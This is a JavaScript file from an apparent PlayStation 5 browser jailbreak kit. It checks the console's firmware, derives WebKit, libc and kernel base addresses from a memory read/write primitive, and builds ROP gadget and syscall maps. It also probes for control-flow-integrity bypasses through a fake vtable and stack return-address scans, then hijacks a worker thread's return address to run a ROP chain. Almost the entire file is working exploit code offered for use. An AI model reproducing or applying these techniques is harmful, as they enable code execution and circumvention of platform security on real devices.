// Where the engine's own files (rop_slave.js, core.js, ...) live, and where the
// site root (offsets/, payloads/, ui/) lives, both relative to the *document*.
// slopkit/poops.html is inside slopkit/ so it keeps the historical defaults;
// the unified index.html at the site root overrides them before loading this.
var SLOPKIT_DIR = (typeof window !== "undefined" && window.SLOP_DIR !== undefined)
    ? window.SLOP_DIR : "";
var SLOPKIT_ROOT = (typeof window !== "undefined" && window.SLOP_ROOT !== undefined)
    ? window.SLOP_ROOT : "../";

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = [
    "7.00", "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
];
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {

    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    // The worker may answer immediately before returning to its idle wait.
    // The exact saved PC is the firmware-specific fingerprint. Do not require
    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                + "-expected=0x" + expected.toString());
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

async function prepare(p) {

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // 9.00+ has no vtable rva; resolve from the host constructor instead.
    // 7.00's profile also ships host-constructor candidates, so the gate is
    // "does this profile have candidates", not a firmware number -- profiles
    // without them still fall back to the vtable rva below.
    // A candidate is accepted only if it lands page-aligned in the user-module
    // band, so a wrong one is rejected rather than used.
    let libSceNKWebKitBase = null;
    if (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    // once per run, before any racer exists
    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap (OFFSET_wk_bootstrap === "selfstack").
    //
    // CFI-immune: hijack a return address on our own main-thread stack. A sort
    // comparator runs with sort's native CallFrame live; the comparator's own
    // CallFrame (JSC 613: Register=8B, returnPC at +0x08, codeBlock at +0x10,
    // callee at +0x18, arg0 at +0x30) holds the return address into sort. We
    // put a distinctive JSValue marker as arg0, scan the 2MB main stack for it,
    // and verify the frame by checking callee == the comparator's own cell.
    // This step REPORTS the located returnPC only (no overwrite) so it cannot
    // crash; the pivot is wired once the locate is confirmed on device.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "selfstack") {
        // Enumerate every thread stack -- we do not assume which thread runs
        // our JS. (base, size) pairs from _thread_list.
        const stacks = [];
        for (let t = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
             t.low || t.hi; t = p.read8(t.add32(0x38))) {
            const sa = p.read8(t.add32(0xA8));
            const sz = p.read8(t.add32(0xB0));
            if ((sa.low || sa.hi) && sz.hi === 0 && sz.low >= 0x4000
                && sz.low <= 0x400000)
                stacks.push([sa, sz.low]);
        }
        jbmark("SELF-STACKS", "count=" + stacks.length + "-sizes="
            + stacks.map(x => "0x" + x[1].toString(16)).join(","));

        const M0 = 0x13370001, M1 = 0x13370002;
        let comparatorAddr = null;
        const frames = [];      // CallFrames whose callee is our comparator

        const comparator = function (a, b) {
            if (frames.length) return 0;
            // Locate the comparator's own CallFrame by its callee slot: scan for
            // a qword == comparatorAddr, then a WebKit-text returnPC must sit at
            // callee-0x10 (callee is CallFrame+0x18, returnPC is CallFrame+0x08).
            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
            for (const [base, size] of stacks) {
                const view = array_from_address(base, size);
                for (let o = 0; o + 8 <= size; o += 8) {
                    if (view[o] !== b0 || view[o + 1] !== b1
                        || view[o + 2] !== b2 || view[o + 3] !== b3) continue;
                    const slot = base.add32(o);
                    const full = p.read8(slot);
                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;   // exact callee
                    if (o < 0x10) continue;
                    const retPC = p.read8(base.add32(o - 0x10));               // CallFrame+0x08
                    const rva = retPC.sub32(libSceNKWebKitBase);
                    const inWk = rva.hi === 0 && (rva.low >>> 0) < 0x3673d22
                        && (rva.low >>> 0) > 0x1000;
                    frames.push({ base, o, calleeSlot: slot, retPC,
                        retSlot: base.add32(o - 0x10),      // CallFrame+0x08
                        cbSlot: base.add32(o - 0x08),       // CallFrame+0x10
                        rva: rva.low >>> 0, inWk });
                    if (frames.length >= 8) return 0;
                }
            }
            return 0;
        };
        comparatorAddr = p.leakval(comparator);
        nogc.push(comparator);
        jbmark("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());

        const arr = [M0, M1];
        arr.sort(comparator);

        jbmark("SELF-FRAMES", "callee-slots-found=" + frames.length);
        let good = null;
        for (let n = 0; n < frames.length; n++) {
            const f = frames[n];
            jbmark("SELF-FRAME", "#" + n + "-stack=0x" + f.base.toString()
                + "-off=0x" + f.o.toString(16)
                + "-returnPC=0x" + f.retPC.toString()
                + (f.inWk ? "(wk+0x" + f.rva.toString(16) + ")" : "(NOT wk)")
                + "-retSlot=0x" + f.retSlot.toString());
            if (f.inWk && !good) good = f;
        }
        if (!good)
            throw new Error("selfstack: found " + frames.length + " callee refs "
                + "but none had a WebKit returnPC at CallFrame+0x08 -- comparator "
                + "may be JIT-compiled (no standard CallFrame). Force interpreter.");
        jbmark("SELF-LOCATE-OK", "comparator CallFrame located; returnPC=wk+0x"
            + good.rva.toString(16) + " at retSlot=0x" + good.retSlot.toString()
            + " -- this is the CFI-immune ret slot to hijack");
        throw new Error("selfstack locate OK: returnPC=wk+0x" + good.rva.toString(16)
            + " at 0x" + good.retSlot.toString() + ". Next: overwrite to pivot.");
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap milestone (OFFSET_wk_bootstrap === "fakevtable").
    //
    // The idle-Worker hijack that every other profile uses cannot work here:
    // on JSC 613 the Worker does not park at a return address any scan can find
    // (its blocking primitive is a raw syscall, and the PLT is `jmp [GOT]`, so
    // nothing that resumes it does so through a stack `ret` we can overwrite).
    //
    // Replacement plan: fake a C++ vtable on the leaked textarea's impl object
    // and let a virtual dispatch hand us `rdi = this` = a known address. That
    // is enough for `longjmp(this)` to pivot into a ROP chain, and later to
    // spawn a dedicated host thread (rop.js thread_rop) so nothing idle is ever
    // hijacked again.
    //
    // This block is ONLY the first, non-destructive verification: point every
    // fake vtable slot at setjmp and find which JS/DOM operation actually
    // performs a controllable virtual call. setjmp ignores its args and just
    // saves registers, so a hit rewrites impl[0..0x48] into a jmp_buf whose
    // +0x00 is a WebKit text address and +0x10 is a stack address -- a
    // signature we can read back. That same call captures the return context
    // the full launcher needs, so a positive result unblocks the rest.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "fakevtable") {
        const SETJMP = libSceLibcInternalBase.add32(OFFSET_lc_setjmp);
        const impl = textAreaVtPtr;              // C++ HTMLTextAreaElement*
        const realVtable = textAreaVtable;       // its genuine vtable
        const N = 64;                            // slots to shadow

        // Build a fake vtable: copy N real entries, then overwrite them all
        // with setjmp. Any virtual that fires lands on setjmp.
        const fakeVtable = malloc(0x8 * (N + 2));
        for (let i = 0; i < N; i++)
            p.write8(fakeVtable.add32(i * 8), p.read8(realVtable.add32(i * 8)));

        const SIG_LO = SETJMP; // (unused sentinel; kept for symmetry)

        function looksLikeJmpBuf() {
            const rip = p.read8(impl);                    // impl[0x00]
            const rsp = p.read8(impl.add32(0x10));        // impl[0x10]
            const ripInWk = rip.sub32(libSceNKWebKitBase);
            const wkOk = ripInWk.hi === 0 && (ripInWk.low >>> 0) < 0x3673d22
                && (ripInWk.low >>> 0) > 0x1000;
            // a stack pointer on PS5 is a high canonical userland address
            const stackOk = (rsp.hi >>> 0) >= 0x7 && (rsp.hi >>> 0) <= 0x8ff
                && (rsp.low & 0xf) === 0;
            return { wkOk, stackOk, rip, rsp };
        }

        // Preserve the impl object's first 0x48 bytes; setjmp overwrites them
        // (rdi = impl), so we restore between trials to keep the textarea usable.
        const implSave = [];
        for (let i = 0; i < 9; i++) implSave.push(p.read8(impl.add32(i * 8)));
        function restoreImpl() {
            for (let i = 0; i < 9; i++) p.write8(impl.add32(i * 8), implSave[i]);
        }

        // Simpler property reads first (least likely to reach a CFI-guarded
        // polymorphic dispatch); heavier DOM ops last. Whichever op leaves a
        // jmp_buf in impl used an UNGUARDED virtual call -- that is the vector.
        const trials = [
            ["nodeName",  () => { void textArea.nodeName; }],
            ["localName", () => { void textArea.localName; }],
            ["tagName",   () => { void textArea.tagName; }],
            ["value",     () => { void textArea.value; }],
            ["type",      () => { void textArea.type; }],
            ["toString",  () => { void textArea.toString(); }],
            ["scrollTop", () => { void textArea.scrollTop; }],
            ["focus",     () => textArea.focus()],
            ["blur",      () => textArea.blur()],
            ["select",    () => textArea.select()],
            ["click",     () => textArea.click()]
        ];

        let winner = null;
        for (const [name, op] of trials) {
            // FVT-TRY is committed to the screen BEFORE the op. If the op
            // performs a CFI-GUARDED virtual call through our out-of-range fake
            // vtable, it traps (ud2 -> SIGILL) and the process dies here -- so
            // an FVT-TRY with no following FVT-RESULT names the guarded op.
            p.write8(impl, fakeVtable);
            jbmark("FVT-TRY", "op=" + name + "-impl=0x" + impl.toString()
                + "-fakevt=0x" + fakeVtable.toString());
            let threw = "";
            try { op(); } catch (e) { threw = String(e && e.message).slice(0, 60); }
            const r = looksLikeJmpBuf();
            jbmark("FVT-RESULT", "op=" + name
                + "-rip=0x" + r.rip.toString() + "-wkOk=" + r.wkOk
                + "-rsp=0x" + r.rsp.toString() + "-stackOk=" + r.stackOk
                + (threw ? "-threw=" + threw : ""));
            if (r.wkOk && r.stackOk) { winner = { name, rip: r.rip, rsp: r.rsp }; break; }
            restoreImpl();
        }

        if (winner) {
            jbmark("FVT-HIT", "op=" + winner.name
                + "-savedRip=0x" + winner.rip.toString()
                + "-savedRsp=0x" + winner.rsp.toString()
                + "  <== controllable virtual call; set OFFSET_wk_vtable_trigger to this op");
            throw new Error("bootstrap milestone: fake-vtable virtual call CONFIRMED via '"
                + winner.name + "'. Next step: wire the longjmp launcher.");
        }
        restoreImpl();
        jbmark("FVT-DONE", "no-op-produced-a-clean-virtual-call"
            + "-all-either-noop-or-CFI-guarded");
        throw new Error("bootstrap milestone: no trial produced a controllable "
            + "virtual call (all no-op or CFI-guarded). Pivot to a CFI-immune "
            + "primitive (jmp_buf / return-address).");
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker(SLOPKIT_DIR + "rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    let worker_stack = find_worker(p, libKernelBase);
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        // Backward-compatible path for original profiles without a saved-PC fingerprint.
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    let pid = await chain.syscall(SYS_GETPID);

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);

    return { p: p2, chain: chain };
}
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);

window.__offsetsScript = fwScript;
fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=19`);
